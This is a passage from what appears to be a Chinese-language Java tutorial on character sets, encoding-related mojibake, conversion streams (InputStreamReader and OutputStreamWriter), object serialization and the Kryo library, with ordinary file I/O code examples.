class="variable">charsetName</span> <span class="operator">=</span> <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编码</span></span><br><span class="line"><span class="type">byte</span>[] bytes = str.getBytes(Charset.forName(charsetName));</span><br><span class="line">System.out.println(<span class="string">&quot;编码: &quot;</span> + bytes);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">decodedStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes, Charset.forName(charsetName));</span><br><span class="line">System.out.println(<span class="string">&quot;解码: &quot;</span> + decodedStr);</span><br></pre></td></tr></table></figure><p>在这个示例中，首先定义了一个字符串变量 str 和一个字符集名称 charsetName。然后，使用 <code>Charset.forName()</code> 方法获取指定字符集的 Charset 对象。接着，使用字符串的 getBytes() 方法将字符串编码为指定字符集的字节数组。最后，使用 <code>new String()</code> 方法将字节数组解码为字符串。</p><h3 id="02、字符集"><a href="#02、字符集" class="headerlink" title="02、字符集"></a>02、字符集</h3><p>Charset：字符集，是一组字符的集合，每个字符都有一个唯一的编码值，也称为码点。<br>常见的字符集包括 ASCII、Unicode 和 GBK，而 Unicode 字符集包含了多种编码方式，比如说 UTF-8、UTF-16。<br><img src="/2024/10/25/code/javaIO/image-2.png"></p><h4 id="ASCII-字符集"><a href="#ASCII-字符集" class="headerlink" title="ASCII 字符集"></a><strong>ASCII 字符集</strong></h4><p>ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）字符集是一种最早的字符集，包含 128 个字符，其中包括控制字符、数字、英文字母以及一些标点符号。ASCII 字符集中的每个字符都有一个唯一的 7 位二进制编码（由 0 和 1 组成），可以表示为十进制数或十六进制数。</p><p>ASCII 编码方式是一种固定长度的编码方式，每个字符都使用 7 位二进制编码来表示。ASCII 编码只能表示英文字母、数字和少量的符号，不能表示其他语言的文字和符号，因此在全球范围内的应用受到了很大的限制。</p><h4 id="Unicode-字符集"><a href="#Unicode-字符集" class="headerlink" title="Unicode 字符集"></a>Unicode 字符集</h4><p>Unicode 包含了世界上几乎所有的字符，用于表示人类语言、符号和表情等各种信息。Unicode 字符集中的每个字符都有一个唯一的码点（code point），用于表示该字符在字符集中的位置，可以用十六进制数表示。</p><p>为了在计算机中存储和传输 Unicode 字符集中的字符，需要使用一种编码方式。UTF-8、UTF-16 和 UTF-32 都是 Unicode 字符集的编码方式，用于将 Unicode 字符集中的字符转换成字节序列，以便于存储和传输。它们的差别在于使用的字节长度不同。</p><ul><li>UTF-8 是一种可变长度的编码方式，对于 ASCII 字符（码点范围为 <code>0x00~0x7F</code>），使用一个字节表示，对于其他 Unicode 字符，使用两个、三个或四个字节表示。UTF-8 编码方式被广泛应用于互联网和计算机领域，因为它可以有效地压缩数据，适用于网络传输和存储。</li><li>UTF-16 是一种固定长度的编码方式，对于基本多语言平面（Basic Multilingual Plane，Unicode 字符集中的一个码位范围，包含了世界上大部分常用的字符，总共包含了超过 65,000 个码位）中的字符（码点范围为 <code>0x0000~0xFFFF</code>），使用两个字节表示，对于其他 Unicode 字符，使用四个字节表示。</li><li>UTF-32 是一种固定长度的编码方式，对于所有 Unicode 字符，使用四个字节表示。</li></ul><h4 id="GBK-字符集"><a href="#GBK-字符集" class="headerlink" title="GBK 字符集"></a>GBK 字符集</h4><p>GBK 包含了 GB2312 字符集中的字符，同时还扩展了许多其他汉字字符和符号，共收录了 21,913 个字符。GBK 采用双字节编码方式，每个汉字占用 2 个字节，其中高字节和低字节都使用了 8 位，因此 GBK 编码共有 <code>2^16=65536</code> 种可能的编码，其中大部分被用于表示汉字字符。</p><p>GBK 编码是一种变长的编码方式，对于 ASCII 字符（码位范围为 0x00 到 0x7F），使用一个字节表示，对于其他字符，使用两个字节表示。GBK 编码中的每个字节都可以采用 0x81 到 0xFE 之间的任意一个值，因此可以表示 <code>2^15=32768</code> 个字符。为了避免与 ASCII 码冲突，GBK 编码的第一个字节采用了 0x81 到 0xFE 之间除了 0x7F 的所有值，第二个字节采用了 0x40 到 0x7E 和 0x80 到 0xFE 之间的所有值，共 94 个值。</p><p>GB2312 的全名是《信息交换用汉字编码字符集基本集》，也被称为“国标码”。采用了双字节编码方式，每个汉字占用 2 个字节，其中高字节和低字节都使用了 8 位，因此 GB2312 编码共有 <code>2^16=65536</code> 种可能的编码，其中大部分被用于表示汉字字符。GB2312 编码中的每个字节都可以采用 0xA1 到 0xF7 之间的任意一个值，因此可以表示 126 个字符。</p><p>GB2312 是一个较为简单的字符集，只包含了常用的汉字和符号，因此对于一些较为罕见的汉字和生僻字，GB2312 不能满足需求，现在已经逐渐被 GBK、GB18030 等字符集所取代。</p><p>GB18030 是最新的中文码表。收录汉字 70244 个，采用多字节编码，每个字可以由 1 个、2 个或 4 个字节组成。支持中国国内少数民族的文字，同时支持繁体汉字以及日韩汉字等。</p><h3 id="03、乱码"><a href="#03、乱码" class="headerlink" title="03、乱码"></a>03、乱码</h3><p>当使用不同的编码方式读取或者写入文件时，就会出现乱码问题，来看示例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;沉默王二！&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 将字符串按GBK编码方式保存到文件中</span></span><br><span class="line">    <span class="type">OutputStreamWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/test_utf8.txt&quot;</span>), <span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">    out.write(s);</span><br><span class="line">    out.close();</span><br><span class="line"></span><br><span class="line">    <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;logs/test_utf8.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> read;</span><br><span class="line">    <span class="keyword">while</span> ((read = fileReader.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        System.out.print((<span class="type">char</span>)read);</span><br><span class="line">    &#125;</span><br><span class="line">    fileReader.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的示例代码中，首先定义了一个包含中文字符的字符串，然后将该字符串按 GBK 编码方式保存到文件中，接着将文件按默认编码方式（UTF-8）读取，并显示内容。此时就会出现乱码问题，显示为“��Ĭ������”。</p><p>这是因为文件中的 GBK 编码的字符在使用 UTF-8 编码方式解析时无法正确解析，从而导致出现乱码问题。</p><p>那如何才能解决乱码问题呢？<br>这就引出我们今天的主角了——转换流。</p><h3 id="04、InputStreamReader"><a href="#04、InputStreamReader" class="headerlink" title="04、InputStreamReader"></a>04、InputStreamReader</h3><p><code>java.io.InputStreamReader</code> 是 Reader 类的子类。它的作用是将字节流（InputStream）转换为字符流（Reader），同时支持指定的字符集编码方式，从而实现字符流与字节流之间的转换。</p><h4 id="1）构造方法-2"><a href="#1）构造方法-2" class="headerlink" title="1）构造方法"></a>1）构造方法</h4><ul><li><code>InputStreamReader(InputStream in)</code>: 创建一个使用默认字符集的字符流。</li><li><code>InputStreamReader(InputStream in, String charsetName)</code>: 创建一个指定字符集的字符流。</li></ul><p>代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;in.txt&quot;</span>));</span><br><span class="line"><span class="type">InputStreamReader</span> <span class="variable">isr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;in.txt&quot;</span>) , <span class="string">&quot;GBK&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="2）解决编码问题"><a href="#2）解决编码问题" class="headerlink" title="2）解决编码问题"></a>2）解决编码问题</h4><p>下面是一个使用 InputStreamReader 解决乱码问题的示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;沉默王二！&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 将字符串按GBK编码方式保存到文件中</span></span><br><span class="line">    <span class="type">OutputStreamWriter</span> <span class="variable">outUtf8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/test_utf8.txt&quot;</span>), <span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">    outUtf8.write(s);</span><br><span class="line">    outUtf8.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将字节流转换为字符流，使用GBK编码方式</span></span><br><span class="line">    <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;logs/test_utf8.txt&quot;</span>), <span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">    <span class="comment">// 读取字符流</span></span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">    <span class="keyword">while</span> ((c = isr.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        System.out.print((<span class="type">char</span>) c);</span><br><span class="line">    &#125;</span><br><span class="line">    isr.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于使用了 InputStreamReader 对字节流进行了编码方式的转换，因此在读取字符流时就可以正确地解析出中文字符，避免了乱码问题。</p><h3 id="05、OutputStreamWriter"><a href="#05、OutputStreamWriter" class="headerlink" title="05、OutputStreamWriter"></a>05、OutputStreamWriter</h3><p><code>java.io.OutputStreamWriter</code> 是 Writer 的子类，字面看容易误以为是转为字符流，其实是将字符流转换为字节流，是字符流到字节流的桥梁。</p><ul><li><code>OutputStreamWriter(OutputStream in)</code>: 创建一个使用默认字符集的字符流。</li><li><code>OutputStreamWriter(OutputStream in, String charsetName)</code>：创建一个指定字符集的字符流。</li></ul><p>代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">OutputStreamWriter</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;a.txt&quot;</span>));</span><br><span class="line"><span class="type">OutputStreamWriter</span> <span class="variable">isr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;b.txt&quot;</span>) , <span class="string">&quot;GBK&quot;</span>);</span><br></pre></td></tr></table></figure><p>通常为了提高读写效率，我们会在转换流上再加一层<a href="https://javabetter.cn/io/buffer.html">缓冲流</a>，来看代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 从文件读取字节流，使用UTF-8编码方式</span></span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">    <span class="comment">// 将字节流转换为字符流，使用UTF-8编码方式</span></span><br><span class="line">    <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(fis, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    <span class="comment">// 使用缓冲流包装字符流，提高读取效率</span></span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">    <span class="comment">// 创建输出流，使用UTF-8编码方式</span></span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">    <span class="comment">// 将输出流包装为转换流，使用UTF-8编码方式</span></span><br><span class="line">    <span class="type">OutputStreamWriter</span> <span class="variable">osw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(fos, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    <span class="comment">// 使用缓冲流包装转换流，提高写入效率</span></span><br><span class="line">    <span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(osw);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取输入文件的每一行，写入到输出文件中</span></span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        bw.write(line);</span><br><span class="line">        bw.newLine(); <span class="comment">// 每行结束后写入一个换行符</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭流</span></span><br><span class="line">    br.close();</span><br><span class="line">    bw.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的示例代码中，首先使用 FileInputStream 从文件中读取字节流，使用 UTF-8 编码方式进行读取。然后，使用 InputStreamReader 将字节流转换为字符流，使用 UTF-8 编码方式进行转换。接着，使用 BufferedReader 包装字符流，提高读取效率。然后，创建 FileOutputStream 用于输出文件，使用 UTF-8 编码方式进行创建。接着，使用 OutputStreamWriter 将输出流转换为字符流，使用 UTF-8 编码方式进行转换。最后，使用 BufferedWriter 包装转换流，提高写入效率。</p><h3 id="06、小结"><a href="#06、小结" class="headerlink" title="06、小结"></a>06、小结</h3><p>InputStreamReader 和 OutputStreamWriter 是将字节流转换为字符流或者将字符流转换为字节流。通常用于解决字节流和字符流之间的转换问题，可以将字节流以指定的字符集编码方式转换为字符流，或者将字符流以指定的字符集编码方式转换为字节流。</p><p>InputStreamReader 类的常用方法包括：</p><ul><li><code>read()</code>：从输入流中读取一个字符的数据。</li><li><code>read(char[] cbuf, int off, int len)</code>：从输入流中读取 len 个字符的数据到指定的字符数组 cbuf 中，从 off 位置开始存放。</li><li><code>ready()</code>：返回此流是否已准备好读取。</li><li><code>close()</code>：关闭输入流。</li></ul><p>OutputStreamWriter 类的常用方法包括：</p><ul><li><code>write(int c)</code>：向输出流中写入一个字符的数据。</li><li><code>write(char[] cbuf, int off, int len)</code>：向输出流中写入指定字符数组 cbuf 中的 len 个字符，从 off 位置开始。</li><li><code>flush()</code>：将缓冲区的数据写入输出流中。</li><li><code>close()</code>：关闭输出流。</li></ul><p>在使用转换流时，需要指定正确的字符集编码方式，否则可能会导致数据读取或写入出现乱码。</p><h2 id="Java序列流"><a href="#Java序列流" class="headerlink" title="Java序列流"></a>Java序列流</h2><p>Java 的序列流（ObjectInputStream 和 ObjectOutputStream）是一种可以将 Java 对象序列化和反序列化的流。</p><h3 id="01、ObjectOutputStream"><a href="#01、ObjectOutputStream" class="headerlink" title="01、ObjectOutputStream"></a>01、ObjectOutputStream</h3><p><code>java.io.ObjectOutputStream</code> 继承自 OutputStream 类，因此可以将序列化后的字节序列写入到文件、网络等输出流中。</p><p>来看 ObjectOutputStream 的构造方法：<br><code>ObjectOutputStream(OutputStream out)</code></p><p>该构造方法接收一个 OutputStream 对象作为参数，用于将序列化后的字节序列输出到指定的输出流中。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br></pre></td></tr></table></figure><p>一个对象要想序列化，必须满足两个条件:</p><ul><li>该类必须实现<a href="https://javabetter.cn/io/Serializbale.html"><code>java.io.Serializable</code> 接口</a>，否则会抛出<code>NotSerializableException</code> 。</li><li>该类的所有字段都必须是可序列化的。如果一个字段不需要序列化，则需要使用<a href="https://javabetter.cn/io/transient.html"><code>transient</code> 关键字</a>进行修饰。static 和 transient 修饰的字段是不会被序列化的。</li></ul><p>使用示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">int</span> age; <span class="comment">// transient瞬态修饰成员,不会被序列化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，来聊聊 <code>writeObject (Object obj)</code> 方法，该方法是 ObjectOutputStream 类中用于将对象序列化成字节序列并输出到输出流中的方法，可以处理对象之间的引用关系、继承关系、静态字段和 transient 字段。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectOutputStreamDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;沉默王二&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/person.dat&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码中，首先创建了一个 Person 对象，然后使用 FileOutputStream 和 ObjectOutputStream 将 Person 对象序列化并输出到 person.dat 文件中。在 Person 类中，实现了 Serializable 接口，表示该类可以进行对象序列化。</p><h3 id="02、ObjectInputStream"><a href="#02、ObjectInputStream" class="headerlink" title="02、ObjectInputStream"></a>02、ObjectInputStream</h3><p>ObjectInputStream 可以读取 ObjectOutputStream 写入的字节流，并将其反序列化为相应的对象（包含<code>对象的数据</code>、<code>对象的类型</code>和<code>对象中存储的属性</code>等信息）。</p><p>说简单点就是，序列化之前是什么样子，反序列化后就是什么样子。</p><p>来看一下构造方法：<code>ObjectInputStream(InputStream in)</code> ： 创建一个指定 InputStream 的 ObjectInputStream。</p><p>其中，ObjectInputStream 的 readObject 方法用来读取指定文件中的对象，示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;logs/person.dat&quot;</span>; <span class="comment">// 待反序列化的文件名</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">     <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn)) &#123;</span><br><span class="line">     <span class="comment">// 从指定的文件输入流中读取对象并反序列化</span></span><br><span class="line">     <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">     <span class="comment">// 将反序列化后的对象强制转换为指定类型</span></span><br><span class="line">     <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) obj;</span><br><span class="line">     <span class="comment">// 打印反序列化后的对象信息</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Deserialized Object: &quot;</span> + p);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">     e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="03、Kryo"><a href="#03、Kryo" class="headerlink" title="03、Kryo"></a>03、Kryo</h3><p>实际开发中，很少使用 JDK 自带的序列化和反序列化，这是因为：</p><ul><li>可移植性差：Java 特有的，无法跨语言进行序列化和反序列化。</li><li>性能差：序列化后的字节体积大，增加了传输&#x2F;保存成本。</li><li>安全问题：攻击者可以通过构造恶意数据来实现远程代码执行，从而对系统造成严重的安全威胁。相关阅读：<a href="https://cryin.github.io/blog/secure-development-java-deserialization-vulnerability/">Java 反序列化漏洞之殇</a> 。</li></ul><p>Kryo 是一个优秀的 Java 序列化和反序列化库，具有高性能、高效率和易于使用和扩展等特点，有效地解决了 JDK 自带的序列化机制的痛点。</p><blockquote><p>GitHub 地址：<a href="https://github.com/EsotericSoftware/kryo">https://github.com/EsotericSoftware/kryo</a></p></blockquote><p>使用示例：</p><p>第一步，在 pom.xml 中引入依赖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引入 Kryo 序列化工具 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;5.4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>第二步，创建一个 Kryo 对象，并使用 <code>register()</code> 方法将对象进行注册。然后，使用 <code>writeObject()</code> 方法将 Java 对象序列化为二进制流，再使用 <code>readObject()</code> 方法将二进制流反序列化为 Java 对象。最后，输出反序列化后的 Java 对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KryoDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(KryoParam.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">KryoParam</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">KryoParam</span>(<span class="string">&quot;沉默王二&quot;</span>, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/kryo.bin&quot;</span>));</span><br><span class="line">        kryo.writeObject(output, object);</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;logs/kryo.bin&quot;</span>));</span><br><span class="line">        <span class="type">KryoParam</span> <span class="variable">object2</span> <span class="operator">=</span> kryo.readObject(input, KryoParam.class);</span><br><span class="line">        System.out.println(object2);</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 